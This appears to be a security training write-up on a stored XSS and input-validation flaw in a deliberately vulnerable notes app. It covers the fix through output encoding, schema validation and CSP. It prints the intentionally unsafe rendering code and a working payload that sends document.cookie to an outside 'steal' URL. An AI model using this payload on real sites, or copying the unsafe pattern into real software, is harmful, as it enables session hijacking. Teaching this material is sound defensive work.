# Stored XSS / missing input validation

> **OWASP:** A03:2021 – Injection · **CWE:** CWE-79, CWE-20

## The flaw

Two things go wrong together.

**Input is not validated.** `apps/vulnerable/api/notes/index.ts` stores the note
body exactly as received — no type check, no length limit, no sanitization.

**Output is not encoded.** `apps/vulnerable/src/pages/NotesPage.tsx` writes the
body into the page as raw HTML:

```tsx
{/* deliberately unsafe: renders the stored body as HTML */}
<div dangerouslySetInnerHTML={{ __html: selected.body }} />
```

Anything stored in a note body is parsed by the browser as markup when the note
is viewed — by its author or, via IDOR, by anyone.

## The exploit

Create a note with this body:

```html
<img src=x onerror="fetch(`https://example.com/steal?c=`+encodeURIComponent(document.cookie))">
```

When the note is viewed the image fails to load, the `onerror` handler runs, and
because the session cookie is **not** `HttpOnly` (see the broken-auth writeup)
it is sent to the attacker. `<svg onload=...>` works the same way. Injected
`<script>` tags do not auto-execute via `innerHTML`, which is why the payload
uses an event handler.

(The body is also concatenated into a single-quoted SQL string, so the payload
avoids single quotes — backticks stand in for the string delimiters. A real
attacker would just as easily use `String.fromCharCode` or an external script.)

Runnable version: [`docs/exploits/stored-xss.http`](../exploits/stored-xss.http).

## The fix

**Encode on output.** `apps/fixed/src/pages/NotesPage.tsx` renders the body as
text:

```tsx
<div style={{ whiteSpace: "pre-wrap" }}>{selected.body}</div>
```

React escapes string children, so `<`, `>`, `&` become entities and the browser
shows the markup literally instead of running it.

**Validate on input.** `apps/fixed/api/_lib/validate.ts` bounds the body:

```ts
export const noteSchema = z.object({
  title: z.string().trim().min(1).max(200),
  body: z.string().max(10_000),
});
```

**Content-Security-Policy.** `apps/fixed/middleware.ts` sends
`script-src 'self'` (no inline, no injected script) in production as a second
wall.

## Why it addresses the root cause

XSS happens when user content is treated as markup. Encoding on output keeps the
content as *data*: it always renders and never executes, regardless of what
characters it contains. This is the same code/data separation principle as SQL
injection, applied to HTML. Input validation and CSP do not fix the root cause
on their own — a bypass in either still leaves you exposed — but they shrink the
attack surface and contain mistakes.

## Security principle

**Encode data for the context it lands in.** HTML body, HTML attribute, URL,
JavaScript, CSS — each needs its own encoding. Treat "render this user content"
as "display this text", never "run this markup".

## References

- OWASP: <https://owasp.org/Top10/A03_2021-Injection/>
- OWASP XSS Prevention Cheat Sheet: <https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>
- CWE-79: <https://cwe.mitre.org/data/definitions/79.html>
